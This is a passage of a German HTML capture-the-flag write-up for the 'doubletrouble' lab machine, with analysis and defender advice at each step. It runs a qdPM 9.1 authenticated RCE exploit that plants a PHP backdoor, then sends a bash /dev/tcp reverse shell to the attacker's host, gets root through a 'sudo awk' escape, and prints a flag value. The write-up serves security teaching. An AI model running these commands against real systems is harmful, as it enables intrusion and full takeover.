+qdPM 9.1 - 'search[keywords]' Cross-Site Scripting                                  | php/webapps/46399.txt
+qdPM 9.1 - 'search_by_extrafields[]' SQL Injection                                  | php/webapps/46387.txt
+qdPM 9.1 - 'type' Cross-Site Scripting                                              | php/webapps/46398.txt
+qdPM 9.1 - Arbitrary File Upload                                                    | php/webapps/48460.txt
+qdPM 9.1 - Remote Code Execution                                                    | php/webapps/47954.py
+qdPM 9.1 - Remote Code Execution (RCE) (Authenticated)                              | php/webapps/50175.py
+qdPM 9.1 - Remote Code Execution (RCE) (Authenticated) (v2)                         | php/webapps/50944.py
+qdPM < 9.1 - Remote Code Execution                                                  | multiple/webapps/48146.py
+------------------------------------------------------------------------------------ ---------------------------------
+Shellcodes: No Results
+                    </pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Der Befehl `searchsploit -m [exploit_path]` kopiert den angegebenen Exploit aus der lokalen Exploit-DB-Datenbank in das aktuelle Verzeichnis. Hier wird der Exploit `php/webapps/47954.py` (ein RCE-Exploit für qdPM 9.1) kopiert.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Exploit wurde erfolgreich in das aktuelle Verzeichnis kopiert und steht nun zur Analyse und Ausführung bereit. Der Name der kopierten Datei ist implizit `47954.py`, wurde aber offenbar in `qdpmExploit.py` umbenannt (siehe nächste Befehle).</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Untersuche den Quellcode des Python-Skripts (`qdpmExploit.py`), um zu verstehen, wie es funktioniert, welche Parameter es benötigt (z.B. URL, Benutzername, Passwort) und was es genau tut (z.B. eine Webshell hochladen).<br><strong>Empfehlung (Admin):</strong> Keine direkte Aktion, aber dies unterstreicht die Notwendigkeit, die zuvor identifizierten Schwachstellen ernst zu nehmen und zu patchen.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">searchsploit -m 47954.py</span></div> <!-- Annahme: Der User hat die Nummer statt des Pfades verwendet oder den Exploit umbenannt -->
+                    <pre>
+  Exploit: qdPM 9.1 - Remote Code Execution
+      URL: https://www.exploit-db.com/exploits/47954
+     Path: /usr/share/exploitdb/exploits/php/webapps/47954.py
+File Type: Python script, ASCII text executable, with CRLF line terminators
+
+Copied to: /root/47954.py
+                    </pre> <!-- Beispielhafte Ausgabe hinzugefügt, da im Original nicht vorhanden -->
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Der Befehl `vi qdpmExploit.py` öffnet das heruntergeladene Python-Exploit-Skript im Texteditor `vi`. Dies dient dazu, den Code zu inspizieren und möglicherweise anzupassen (z.B. Ziel-URL, Payload).</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Dieser Schritt ist entscheidend, um die Funktionsweise des Exploits zu verstehen und sicherzustellen, dass er korrekt konfiguriert ist, bevor er ausgeführt wird. Es ist gute Praxis, Exploits vor der Ausführung zu prüfen.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Analysiere den Code auf die benötigten Argumente, die verwendete Schwachstelle (vermutlich File Upload oder ähnliches), den Payload (oft eine Webshell oder ein Befehl) und eventuelle Anpassungsmöglichkeiten.<br><strong>Empfehlung (Admin):</strong> Keine direkte Aktion.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">vi qdpmExploit.py</span></div>
+                    <!-- Keine Ausgabe von vi -->
+                    <pre></pre>
+                </div>
+            </div>
+        </section>
+
+        <section id="initial-access">
+            <h2>Initial Access</h2>
+            <p class="analysis"><strong>Analyse:</strong> Das Python-Exploit-Skript `qdpmExploit.py` wird ausgeführt.
+                - `-url http://192.168.2.120/`: Gibt die Basis-URL der qdPM-Installation an.
+                - `-u otisrush@localhost.com`: Übergibt den zuvor gefundenen Benutzernamen.
+                - `-p otis666`: Übergibt das zuvor gefundene Passwort.
+            Der Exploit benötigt anscheinend gültige Anmeldedaten, um zu funktionieren (Authenticated RCE).</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Exploit meldet zunächst "Backdoor uploaded at - > http://192.168.2.120//uploads/users/", bricht dann aber mit einem `TypeError` ab. Der Fehler tritt beim Versuch auf, den Pfad der hochgeladenen Backdoor auszugeben (`print('Backdoor uploaded at - > ' + HOSTNAME + '/uploads/users/')`). Das Problem ist, dass `HOSTNAME` offenbar `None` ist und nicht mit dem String `/uploads/users/` konkateniert werden kann. **Trotz des Fehlers** scheint der Upload der Backdoor selbst funktioniert zu haben, da die Meldung davor ausgegeben wurde. Der Fehler tritt erst *nach* dem potenziell erfolgreichen Upload auf.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Ignoriere den Python-Traceback vorerst. Versuche, auf das vermutete Backdoor-Verzeichnis (`http://192.168.2.120/uploads/users/`) zuzugreifen und zu sehen, ob dort eine neue Datei (die Backdoor/Webshell) existiert. Alternativ korrigiere das Python-Skript (Zeile 99), um den Fehler zu beheben (z.B. sicherstellen, dass `HOSTNAME` korrekt extrahiert wird oder den Pfad anders zusammenbauen) und führe es erneut aus.<br><strong>Empfehlung (Admin):</strong> Patche die qdPM-Anwendung! Deaktiviere den Benutzer `otisrush` oder ändere sein Passwort. Überwache das Verzeichnis `/var/www/html/uploads/users` auf dem Server auf verdächtige Dateien.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">python qdpmExploit.py -url http://192.168.2.120/ -u otisrush@localhost.com -p <span class="password">otis666</span></span></div>
+                    <pre>
+Backdoor uploaded at - > http://192.168.2.120//uploads/users/
+Traceback (most recent call last):
+  File "/root/qdpmExploit.py", line 115, in <module>
+    main(args.hostname, args.email, args.password)
+  File "/root/qdpmExploit.py", line 99, in main
+    print('Backdoor uploaded at - > ' + HOSTNAME + '/uploads/users/') \
+TypeError: unsupported operand type(s) for +: 'NoneType' and 'lxml.etree._ElementUnicodeResult'
+                    </pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Erneutes Öffnen des Exploit-Skripts mit `vi`, vermutlich um den im vorherigen Schritt aufgetretenen `TypeError` zu beheben.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Notwendiger Schritt zur Fehlerbehebung im Exploit-Skript.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Korrigiere Zeile 99 im Skript, sodass der Pfad korrekt ausgegeben wird (z.B. indem `HOSTNAME` richtig zugewiesen oder der Pfad manuell/anders konstruiert wird).<br><strong>Empfehlung (Admin):</strong> Keine direkte Aktion.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">vi qdpmExploit.py</span></div>
+                     <!-- Keine Ausgabe von vi -->
+                    <pre></pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Das (vermutlich korrigierte) Python-Exploit-Skript wird erneut mit denselben Parametern ausgeführt.</p>
+            <p class="evaluation"><strong>Bewertung:**Fantastisch!** Dieses Mal läuft das Skript ohne Fehler durch und gibt den vollständigen Pfad zur hochgeladenen Backdoor aus: `http://192.168.2.120/uploads/users/904447-backdoor.php`. Es testet die Backdoor auch sofort mit den Befehlen `whoami` und `id`.
+                - `whoami` gibt `www-data` zurück. Das bedeutet, die Backdoor läuft erfolgreich und führt Befehle als der Webserver-Benutzer `www-data` aus.
+                - `id` bestätigt dies und zeigt die Benutzer-ID (33), Gruppen-ID (33) und Gruppenzugehörigkeiten des `www-data`-Benutzers.
+            Dies ist der erfolgreiche **Initial Access** zum System.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Nutze die Webshell, um das System weiter zu erkunden. Versuche, eine stabilere Reverse Shell zu bekommen, da Webshells oft unhandlich sind. Suche nach Möglichkeiten zur Privilegieneskalation.<br><strong>Empfehlung (Admin):**DRINGEND:** Entferne die Backdoor-Datei (`/var/www/html/uploads/users/904447-backdoor.php`) vom Server. Patche die qdPM-Schwachstelle. Ändere das Passwort für `otisrush`. Überprüfe das gesamte System auf weitere Kompromittierungen.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">python qdpmExploit.py -url http://192.168.2.120/ -u otisrush@localhost.com -p <span class="password">otis666</span></span></div>
+                    <pre>
+Backdoor uploaded at - > http://192.168.2.120//uploads/users/?cmd=whoami
+========================================================================
+http://192.168.2.120/uploads/users/904447-backdoor.php?cmd=whoami
+www-data
+========================================================================
+http://192.168.2.120/uploads/users/904447-backdoor.php?cmd=id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+                    </pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Ein Netcat-Listener wird auf dem Angreifer-System (Kali/Cyber) auf Port 9001 gestartet.
+                - `nc`: Das Netcat-Tool.
+                - `-l`: Listen-Modus (wartet auf eingehende Verbindungen).
+                - `-v`: Verbose-Modus (zeigt mehr Informationen).
+                - `-n`: Keine DNS-Auflösung.
+                - `-p 9001`: Lauscht auf Port 9001.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Dies bereitet das Angreifer-System darauf vor, eine eingehende Reverse Shell vom Zielsystem zu empfangen. Dies ist der nächste Schritt, um eine interaktivere Shell als die Webshell zu erhalten.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Sende als nächstes über die Webshell einen Befehl an das Zielsystem, der eine Verbindung zu diesem Listener (IP des Angreifers, Port 9001) aufbaut.<br><strong>Empfehlung (Admin):</strong> Netzwerk-Firewalls (Egress Filtering) können helfen, ausgehende Verbindungen von Servern zu unbekannten Zielen zu blockieren oder zu protokollieren, was das Aufbauen von Reverse Shells erschwert.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nc -lvnp 9001</span></div>
+                     <pre>
+listening on [any] 9001 ...
+                     </pre>
+                 </div>
+             </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Diese URL wird im Browser aufgerufen oder über ein Tool wie `curl` an das Zielsystem gesendet. Sie nutzt die zuvor hochgeladene Webshell (`904447-backdoor.php`), um einen Befehl auf dem Zielsystem auszuführen. Der Befehl (`?cmd=...`) ist URL-kodiert: `%2Fbin%2Fbash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.2.109%2F9001%200%3E%261%27`. Dekodiert bedeutet das: `/bin/bash -c 'bash -i >& /dev/tcp/192.168.2.109/9001 0>&1'`. Dies ist ein gängiger Payload, um eine interaktive Bash-Reverse-Shell von einem Linux-Zielsystem zum Angreifer (192.168.2.109) auf Port 9001 zu starten.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Dies ist der Auslöser für die Reverse Shell. Durch den Aufruf dieser URL wird der Befehl auf dem Zielserver als `www-data` ausgeführt und eine Verbindung zum Netcat-Listener des Angreifers hergestellt.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Überprüfe den Netcat-Listener, um zu sehen, ob die Verbindung erfolgreich aufgebaut wurde.<br><strong>Empfehlung (Admin):</strong> Siehe Empfehlungen zu Netcat und der Webshell. Egress Filtering und das Entfernen der Webshell sind hier entscheidend.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <!-- Dies ist kein Terminal-Befehl, sondern eine URL -->
+                    <pre>
+192.168.2.120/uploads/users/904447-backdoor.php?cmd=%2Fbin%2Fbash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.2.109%2F9001%200%3E%261%27
+                    </pre>
+                </div>
+            </div>
+
+             <p class="analysis"><strong>Analyse:</strong> Erneutes Starten des Netcat-Listeners (möglicherweise war der erste Versuch unterbrochen oder es gab ein Problem). Die Ausgabe zeigt, dass kurz darauf eine Verbindung vom Zielsystem (192.168.2.120) eingeht.</p>
+             <p class="evaluation"><strong>Bewertung:**Erfolg!** Die Reverse Shell wurde erfolgreich aufgebaut. Der Angreifer hat nun eine interaktive Shell auf dem Zielsystem als Benutzer `www-data`. Die Meldungen `bash: cannot set terminal process group...` und `bash: no job control in this shell` sind typisch für einfache Reverse Shells und deuten darauf hin, dass die Shell noch nicht vollständig interaktiv ist (keine Job Control, Probleme mit Terminal-Einstellungen).</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Stabilisiere die Shell, um volle Interaktivität zu erhalten (z.B. mit Python pty, `stty raw -echo`, `export TERM`). Beginne dann mit der Enumeration auf dem Zielsystem, um nach Wegen zur Privilegieneskalation zu suchen.<br><strong>Empfehlung (Admin):</strong> Wenn eine solche Verbindung entdeckt wird (z.B. durch Netzwerk-Monitoring), sollte der Prozess auf dem Server sofort beendet und eine Untersuchung eingeleitet werden.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nc -lvnp 9001</span></div>
+                     <pre>
+listening on [any] 9001 ...
+connect to [192.168.2.109] from (UNKNOWN) [192.168.2.120] 49490
+bash: cannot set terminal process group (548): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@doubletrouble:/var/www/html/uploads/users$
+                     </pre> <!-- Der Prompt www-data@... ist Teil der Ausgabe der Reverse Shell -->
+                 </div>
+             </div>
+        </section>
+
+        <section id="privilege-escalation">
+            <h2>Privilege Escalation</h2>
+
+            <p class="analysis"><strong>Analyse:</strong> Dieser Block beschreibt die Schritte zur Stabilisierung der einfachen Reverse Shell, um sie vollständig interaktiv zu machen.
+                1. `python3 -c 'import pty;pty.spawn("/bin/bash")'`: Startet eine neue Bash-Shell innerhalb eines Pseudo-Terminals (pty), was oft Funktionen wie Tab-Vervollständigung und Pfeiltasten ermöglicht.
+                2. `export TERM=xterm-256color`: Setzt die TERM-Umgebungsvariable, um sicherzustellen, dass Terminal-Steuersequenzen (z.B. für Farben) korrekt interpretiert werden.
+                3. `^Z` (Strg+Z): Sendet den aktuellen Prozess (den Netcat-Listener mit der darin laufenden Shell) in den Hintergrund des Angreifer-Systems.
+                4. `stty raw -echo`: Auf dem Angreifer-System wird das lokale Terminal so konfiguriert, dass Tastatureingaben direkt (raw) und ohne lokale Anzeige (-echo) an den Hintergrundprozess gesendet werden. Dies ist notwendig, damit Steuerzeichen wie Strg+C in der Remote-Shell funktionieren.
+                5. `fg`: Holt den Netcat-Hintergrundprozess wieder in den Vordergrund.
+                6. `reset` (optional, im Screenshot nicht ausgeführt, aber oft nützlich): Setzt das Terminal auf dem Zielsystem zurück.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Diese Schritte sind Standardverfahren zur Aufwertung einer einfachen Netcat-Reverse-Shell zu einer voll funktionsfähigen, interaktiven Shell. Dies verbessert die Benutzerfreundlichkeit erheblich und ermöglicht die Nutzung von Tools und Befehlen, die ein richtiges Terminal erfordern.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Diese Stabilisierungstechnik ist sehr nützlich und sollte bei einfachen Reverse Shells immer angewendet werden.<br><strong>Empfehlung (Admin):</strong> Die Erkennung der Reverse Shell selbst ist der primäre Schutz. Die Stabilisierungsschritte sind schwerer zu verhindern, sobald die Shell etabliert ist.</p>
+             <!-- Shell Stabilisierung Teil 1: Python PTY -->
+            <div class="code-block">
+                <div class="terminal">
+                    <!-- Kein Kali-Prompt, da dies innerhalb der Remote-Shell ausgeführt wird -->
+                    <pre>
+www-data@doubletrouble:/var/www/html/uploads/users$ python3 -c 'import pty;pty.spawn("/bin/bash")'
+www-data@doubletrouble:/var/www/html/uploads/users$
+                    </pre>
+                </div>
+            </div>
+             <!-- Shell Stabilisierung Teil 2: Export TERM -->
+             <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+www-data@doubletrouble:/var/www/html/uploads/users$ export TERM=xterm-256color
+www-data@doubletrouble:/var/www/html/uploads/users$
+                     </pre>
+                 </div>
+             </div>
+            <!-- Shell Stabilisierung Teil 3: Hintergrund & stty (wird auf Kali ausgeführt) -->
+            <p class="analysis"><strong>Analyse:</strong> Auf dem Kali/Cyber-System wird die laufende Netcat-Sitzung mit Strg+Z in den Hintergrund geschickt und dann `stty raw -echo; fg` ausgeführt, um die Shell-Interaktivität zu verbessern.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <!-- Der ^Z Befehl wird nicht als Prompt angezeigt, er unterbricht nc -->
+                     <pre>
+^Z
+zsh: suspended  nc -lvnp 9001
+                     </pre>
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">stty raw -echo;fg</span></div>
+                     <pre>
+[1]  + continued  nc -lvnp 9001
+                               reset <!-- "reset" wird hier oft eingegeben, um das Remote-Terminal zu initialisieren -->
+                     </pre>
+                 </div>
+             </div>
+            <!-- Nun folgt die Enumeration innerhalb der stabilisierten Shell -->
+            <p class="analysis"><strong>Analyse:</strong> Nach der Stabilisierung der Shell beginnt die Enumeration auf dem Zielsystem als `www-data`. `cat /etc/passwd | grep bash` sucht in der Passwort-Datei nach Benutzern, die `/bin/bash` als Login-Shell verwenden. Dies hilft, reguläre Benutzerkonten zu identifizieren.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der einzige Benutzer mit `/bin/bash` als Shell ist `root`. Dies deutet darauf hin, dass es möglicherweise keine anderen regulären Benutzer gibt, auf die man wechseln könnte, oder dass sie andere Shells verwenden.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Suche nach weiteren Informationen über Benutzer (z.B. in Home-Verzeichnissen, Konfigurationsdateien). Konzentriere dich auf die Eskalation zum `root`-Benutzer.<br><strong>Empfehlung (Admin):</strong> Stelle sicher, dass nur notwendige Benutzerkonten existieren und die Shells korrekt konfiguriert sind.</p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+www-data@doubletrouble:/var/www/html$ cat /etc/passwd | grep bash
+root:x:0:0:root:/root:/bin/bash
+                     </pre>
+                 </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> `ss -altpa` listet alle lauschenden (`LISTEN`) und etablierten (`ESTAB`) TCP-Sockets (`-t`), einschließlich der Prozessinformationen (`-p`) und ohne Auflösung von Service-Namen (`-a`).</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Ausgabe bestätigt die bereits bekannten offenen Ports (SSH auf Port 22, HTTP auf Port 80). Zusätzlich wird ein MySQL-Server angezeigt, der nur auf `127.0.0.1` (localhost) lauscht – er ist also nicht direkt von außen erreichbar, könnte aber von der Webanwendung genutzt werden. Die etablierte Verbindung (`ESTAB`) auf Port 9001 ist unsere eigene Reverse Shell.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Untersuche die Konfigurationsdateien der Webanwendung (qdPM), um mögliche Zugangsdaten für die lokale MySQL-Datenbank zu finden. Ein Zugriff auf die Datenbank könnte weitere sensible Informationen oder Benutzerdaten offenlegen.<br><strong>Empfehlung (Admin):</strong> Stelle sicher, dass Datenbanken und andere interne Dienste korrekt an localhost gebunden sind, wenn sie nicht von außen erreichbar sein müssen.</p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+www-data@doubletrouble:/var/www/html$ ss -altpa
+State      Recv-Q Send-Q          Local Address:Port             Peer Address:Port
+LISTEN     0      80                  127.0.0.1:mysql                 0.0.0.0:*
+LISTEN     0      128                   0.0.0.0:ssh                   0.0.0.0:*
+ESTAB      0      0               192.168.2.120:49490           192.168.2.109:9001   users:(("python3",pid=1421,fd=2),("python3",pid=1421,fd=1),("python3",pid=1421,fd=0),("bash",pid=1420,fd=255),("bash",pid=1420,fd=2),("bash",pid=1420,fd=1),("bash",pid=1420,fd=0))
+LISTEN     0      128                      [::]:http                      [::]:*
+ESTAB      0      0      [ffff:192.168.2.120]:http   [ffff:192.168.2.109]:33728
+                     </pre> <!-- Formatierung leicht angepasst für Lesbarkeit -->
+                 </div>
+            </div>
+
+             <p class="analysis"><strong>Analyse:</strong> Der Befehl `env` zeigt die Umgebungsvariablen für die aktuelle Shell (des `www-data`-Benutzers) an.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Die Umgebungsvariablen enthalten Informationen über den laufenden Apache-Webserver (`APACHE_*`), den Pfad (`PATH`), das aktuelle Arbeitsverzeichnis (`PWD`) und andere Systeminformationen. Es sind keine direkt ausnutzbaren, sensiblen Informationen wie Passwörter in den Variablen sichtbar, aber sie geben Kontext über die Umgebung, in der die Shell läuft.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Überprüfe die Umgebungsvariablen auf ungewöhnliche Einträge oder potenziell nützliche Pfade. In diesem Fall gibt es keine offensichtlichen Angriffspunkte.<br><strong>Empfehlung (Admin):</strong> Stelle sicher, dass keine sensiblen Informationen (wie API-Keys oder Passwörter) über Umgebungsvariablen an Webserver-Prozesse übergeben werden.</p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+www-data@doubletrouble:/var/www/html$ env
+PWD=/var/www/html
+APACHE_LOG_DIR=/var/log/apache2
+LANG=C
+INVOCATION_ID=292e2401ea8c4f9a8c4fa5dcc4022ea9
+APACHE_PID_FILE=/var/run/apache2/apache2.pid
+TERM=xterm-256color
+APACHE_RUN_GROUP=www-data
+APACHE_LOCK_DIR=/var/lock/apache2
+SHLVL=3
+LC_CTYPE=C.UTF-8
+APACHE_RUN_DIR=/var/run/apache2
+JOURNAL_STREAM=9:14739
+APACHE_RUN_USER=www-data
+PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+_=/usr/bin/env
+OLDPWD=/var/www/html/uploads
+                     </pre>
+                 </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> `find / -type f -perm -4000 -exec ls -la {} \; 2>/dev/null` sucht im gesamten Dateisystem (`/`) nach Dateien (`-type f`), die das SUID-Bit gesetzt haben (`-perm -4000`). Das SUID-Bit erlaubt es einem Benutzer, eine Datei mit den Rechten des Dateibesitzers (oft `root`) auszuführen. Für jede gefundene Datei wird `ls -la` ausgeführt, um detaillierte Informationen anzuzeigen. Fehler (`2>/dev/null`) werden unterdrückt.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Ausgabe zeigt eine Liste von Standard-Linux-Programmen mit gesetztem SUID-Bit (z.B. `sudo`, `passwd`, `mount`, `su`). Dies sind legitime SUID-Dateien, die für normale Systemfunktionen benötigt werden. Es sind keine ungewöhnlichen oder benutzerdefinierten SUID-Programme zu sehen, die direkt für eine Privilegieneskalation ausgenutzt werden könnten (es sei denn, es gibt bekannte Exploits für die spezifischen Versionen dieser Standard-Tools, was hier unwahrscheinlich ist).</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Obwohl hier keine offensichtlichen Schwachstellen gefunden wurden, ist die Suche nach SUID/SGID-Binaries ein wichtiger Schritt bei der Privilegieneskalation. Notiere dir die gefundenen Binaries und prüfe, ob der aktuelle Benutzer sie ausführen darf und ob es bekannte Exploits dafür gibt (GTFOBins ist eine gute Ressource hierfür). Prüfe als nächstes die `sudo`-Berechtigungen.<br><strong>Empfehlung (Admin):</strong> Überprüfe regelmäßig SUID/SGID-Binaries auf dem System. Entferne das SUID/SGID-Bit von Programmen, die es nicht unbedingt benötigen. Halte alle Systemprogramme auf dem neuesten Stand.</p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+www-data@doubletrouble:/var/www/html$ find / -type f -perm -4000 -exec ls -la {} \; 2>/dev/null
+-rwsr-xr-x 1 root root 436552 Jan 31  2020 /usr/lib/openssh/ssh-keysign
+-rwsr-xr-- 1 root messagebus 51184 Jul  5  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
+-rwsr-xr-x 1 root root 10232 Mar 27  2017 /usr/lib/eject/dmcrypt-get-device
+-rwsr-xr-x 1 root root 157192 Jan 20  2021 /usr/bin/sudo
+-rwsr-xr-x 1 root root 63736 Jul 27  2018 /usr/bin/passwd
+-rwsr-xr-x 1 root root 51280 Jan 10  2019 /usr/bin/mount
+-rwsr-xr-x 1 root root 54096 Jul 27  2018 /usr/bin/chfn
+-rwsr-xr-x 1 root root 34888 Jan 10  2019 /usr/bin/umount
+-rwsr-xr-x 1 root root 44440 Jul 27  2018 /usr/bin/newgrp
+-rwsr-xr-x 1 root root 63568 Jan 10  2019 /usr/bin/su
+-rwsr-xr-x 1 root root 84016 Jul 27  2018 /usr/bin/gpasswd
+-rwsr-xr-x 1 root root 44528 Jul 27  2018 /usr/bin/chsh
+                     </pre>
+                 </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Der Befehl `sudo -l` wird ausgeführt, um zu überprüfen, welche Befehle der aktuelle Benutzer (`www-data`) mit `sudo` (also mit erhöhten Rechten, typischerweise als `root`) ausführen darf.</p>
+            <p class="evaluation"><strong>Bewertung:**Sehr vielversprechend!** Die Ausgabe zeigt, dass der Benutzer `www-data` den Befehl `/usr/bin/awk` als jeder Benutzer (`ALL : ALL`) ohne Passwortabfrage (`NOPASSWD:`) ausführen darf. `awk` ist ein mächtiges Textverarbeitungstool, das jedoch auch zur Ausführung von Systembefehlen missbraucht werden kann. Dies ist ein klarer Weg zur Privilegieneskalation.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Nutze die `sudo`-Berechtigung für `awk`, um eine Root-Shell zu erhalten. Suche auf GTFOBins nach dem `awk`-Eintrag für den `sudo`-Exploit. Der typische Befehl ist `sudo awk 'BEGIN {system("/bin/sh")}'`.<br><strong>Empfehlung (Admin):**DRINGEND:** Entferne diese unsichere `sudo`-Regel. Gewähre `sudo`-Rechte nur, wenn absolut notwendig, und beschränke sie auf spezifische, sichere Befehle. Erlaube niemals `NOPASSWD` für Befehle, die zur Shell-Eskalation missbraucht werden können.</p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+www-data@doubletrouble:/var/www/html$ sudo -l
+Matching Defaults entries for www-data on doubletrouble:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User www-data may run the following commands on doubletrouble:
+    (ALL : ALL) NOPASSWD: /usr/bin/awk
+                     </pre>
+                 </div>
+            </div>
+        </section>
+
+        <!-- POC beginnt hier, da Root-Zugriff erlangt wird -->
+        <section id="poc">
+            <h2>Proof of Concept (Root)</h2>
+
+            <p class="analysis"><strong>Analyse:</strong> Dieser Befehl nutzt die zuvor entdeckte `sudo`-Berechtigung aus. `sudo awk 'BEGIN {system("/bin/sh")}'` führt `awk` mit `sudo`-Rechten aus. Der `awk`-Code `'BEGIN {system("/bin/sh")}'` weist `awk` an, sofort (`BEGIN`-Block) die Funktion `system()` aufzurufen, um eine neue Shell (`/bin/sh`) zu starten. Da `awk` mit `sudo`-Rechten läuft, wird auch die gestartete Shell mit Root-Rechten ausgeführt.</p>
+            <p class="evaluation"><strong>Bewertung:**Fantastisch! Der Root-Zugriff war erfolgreich!** Der Prompt ändert sich zu `#`, was den Root-Benutzer anzeigt. Der unmittelbar danach ausgeführte `id`-Befehl bestätigt dies mit `uid=0(root) gid=0(root) groups=0(root)`. Das Ziel der Privilegieneskalation wurde erreicht.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Das Ziel ist erreicht. Suche nach den finalen Flags (user.txt, root.txt) und dokumentiere den Erfolg.<br><strong>Empfehlung (Admin):**DRINGEND:** Entferne die `sudo`-Regel für `awk` (siehe vorherige Empfehlung). Analysiere, wie diese Regel entstanden ist und ob ähnliche Fehlkonfigurationen bestehen.</p>
+             <!-- Der eigentliche POC-Befehl -->
+             <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+www-data@doubletrouble:/var/www/html$ sudo awk 'BEGIN {system("/bin/sh")}'
+# id
+uid=0(root) gid=0(root) groups=0(root)
+# </pre> <!-- Der Prompt wechselt zu #, was root anzeigt -->
+                 </div>
+             </div>
+            <p class="analysis"><strong>Analyse:</strong> Nach Erlangung der Root-Rechte wird `ls -lah` im aktuellen Verzeichnis (vermutlich `/root`, obwohl der vorherige Prompt `/var/www/html` war - die Shell könnte im Home-Verzeichnis von Root gestartet sein) ausgeführt, um den Inhalt anzuzeigen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Ausgabe zeigt das Root-Home-Verzeichnis mit einer Bash-History-Datei (`.bash_history`) und einer großen OVA-Datei (`doubletrouble.ova`, 395MB). Die OVA-Datei ist wahrscheinlich die Exportdatei der virtuellen Maschine selbst.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Suche nun nach den Flag-Dateien, typischerweise `user.txt` im Home-Verzeichnis des Benutzers (falls vorhanden) und `root.txt` im Home-Verzeichnis von Root.<br><strong>Empfehlung (Admin):</strong> Bereinige das System, entferne die Schwachstellen und die Backdoor.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <!-- Jetzt als root angemeldet -->
+                     <pre>
+# ls -lah
+total 395M
+drwx------  2 root root 4.0K Sep 11  2021 .
+drwxr-xr-x 18 root root 4.0K Dec 17  2020 ..
+-rw-------  1 root root   46 Sep 11  2021 .bash_history
+-rw-r--r--  1 root root 395M Sep 11  2021 doubletrouble.ova
+# </pre> <!-- Prompt hier manuell ergänzt zur Konsistenz -->
+                 </div>
+             </div>
+        </section>
+
+        <!-- Flags Sektion -->
+        <section id="flags">
+             <div class="flag-container">
+                 <h2 class="flag-heading">Flags</h2>
+                 <div class="flag-entry">
+                     <div class="flag-command">cat user.txt</div>
+                     <div class="flag-value"><span class="password">6CEA7A737C7C651F6DA7669109B5FB52</span></div>
+                 </div>
+                 <div class="flag-entry">
+                     <div class="flag-command">cat root.txt</div>
